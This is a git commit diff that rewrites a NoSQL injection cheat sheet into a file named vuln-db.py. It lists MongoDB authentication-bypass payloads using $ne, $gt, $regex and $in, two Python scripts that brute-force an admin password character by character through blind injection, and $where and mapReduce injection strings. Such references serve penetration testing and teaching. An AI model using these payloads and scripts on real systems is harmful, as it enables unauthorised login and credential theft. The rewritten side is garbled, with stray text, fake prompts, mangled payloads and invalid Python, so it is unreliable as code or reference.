3dcec9925134a4124f4c47724eb00f0bb2a33440
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-04-03 19:48:25 -0500

    Update and rename README.md to vuln-db.py

--- NoSQL Injection/vuln-db.py
+++ NoSQL Injection/vuln-db.py
@@ -1,10 +1,9 @@
-# NoSQL injection
-
-> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
-
-## Summary
-
-* [Tools](#tools)
+没有搜索-查询有效载荷！？
+> NoSQL databases provide looser consistency restrictions than traditional SQL databases. 
+> By requiring fewer relational constraints and consistency checks.
+> NoSQL databases offer performance and scaling benefits. 
+> These databases are still potentially vulnerable to injection attacks...
+> if Summary * [Tools](#tools)
 * [Exploit](#exploits)
   * [Authentication Bypass](#authentication-bypass)
   * [Extract length information](#extract-length-information)
@@ -14,80 +13,54 @@
   * [GET](#get)
 * [MongoDB Payloads](#mongodb-payloads)
 * [References](#references)
-
-## Tools
-
+ Tools
 * [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)
 * [nosqlilab - A lab for playing with NoSQL Injection](https://github.com/digininja/nosqlilab)
-
-## Exploit
-
-### Authentication Bypass
-
-Basic authentication bypass using not equal ($ne) or greater ($gt)
-
-```json
-in DATA
+ Xploit 0Auth || 0Auth not equal ($ne) or greater ($gt);
+>>>import json in .dat
 username[$ne]=toto&password[$ne]=toto
 login[$regex]=a.*&pass[$ne]=lol
 login[$gt]=admin&login[$lt]=test&pass[$ne]=1
 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
-
+<>
 in JSON
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
 {"username": {"$gt":""}, "password": {"$gt":""}}
-```
-
-### Extract length information
-
-```json
+ Extract length-info
+in JSON
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
-```
-
-### Extract data information
-
-```json
+ Extract info.dat
+in json
 in URL
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
 username[$ne]=toto&password[$regex]=mdp
-
 username[$ne]=toto&password[$regex]=m.*
 username[$ne]=toto&password[$regex]=md.*
-
 in JSON
 {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
 {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
 {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
-```
-
-Extract data with "in"
-
-```json
+Extract .dat with "in" for
+ in json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
-```
-
-
-## Blind NoSQL
-
-### POST with JSON body
-
-
-```python
-import requests
-import urllib3
-import string
-import urllib
+$Blind__NoSQL
+ [POST] with [JSON] 
+  _body_
+>>>import requests
+>>>import urllib3
+>>>import string
+>>>import urllib
 urllib3.disable_warnings()
-
+<>
 username="admin"
 password=""
 u="http://example.org/login"
 headers={'content-type': 'application/json'}
-
+<>
 while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
@@ -96,21 +69,18 @@ while True:
             if 'OK' in r.text or r.status_code == 302:
                 print("Found one more char : %s" % (password+c))
                 password += c
-```
-
-### GET
-
-```python
-import requests
-import urllib3
-import string
-import urllib
+# GET
+~
+>>>import requests
+>>>import urllib3
+>>>import string
+>>>import urllib
 urllib3.disable_warnings()
-
+<>
 username='admin'
 password=''
 u='http://example.org/login'
-
+<>
 while True:
   for c in string.printable:
     if c not in ['*','+','.','?','|', '#', '&', '$']:
@@ -119,33 +89,34 @@ while True:
       if 'Yeah' in r.text:
         print("Found one more char : %s" % (password+c))
         password += c
-```
-
-## MongoDB Payloads
-
-```bash
-true, $where: '1 == 1'
-, $where: '1 == 1'
+<>
+# MongoDB Payloads
+  true 
 $where: '1 == 1'
-', $where: '1 == 1'
-1, $where: '1 == 1'
-{ $ne: 1 }
-', $or: [ {}, { 'a':'a
-' } ], $comment:'successful MongoDB injection'
-db.injection.insert({success:1});
-db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
-|| 1==1
-' && this.password.match(/.*/)//+%00
-' && this.passwordzz.match(/.*/)//+%00
-'%20%26%26%20this.password.match(/.*/)//+%00
-'%20%26%26%20this.passwordzz.match(/.*/)//+%00
-{$gt: ''}
+$where: '1 == 1'
+$where: '1 == 1'<br> 
+$where: '1 == 1'1<br> 
+$where: '1 == 1'
+  { 
+   $ne: 1 
+  };<br> 
+$or: [{void};
+      { 
+       'a':'a' 
+      }; 
+    ];<br> 
+       $comment:'S U C C E S S !'
+$db.injection.insert({success:1});
+$db.injection.insert({success:1});
+ return
+ 1;$db.stores.mapReduce(function(string) 
+                        { 
+                         { emit(1,1||1==1'&&this.password.match(/.*/)//+%00'&&'this.passwordzz.match(/.*/)//+%00'%20%26%26%20this.password.match(/.*/)//+%00'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: 'NUL'};
 [$ne]=1
-```
-
-## References
-
 * [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
 * [Testing for NoSQL injection - OWASP](https://www.owasp.org/index.php/Testing_for_NoSQL_injection)
 * [NoSQL injection wordlists - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
 * [NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
+                                {void};
+                                }}]]
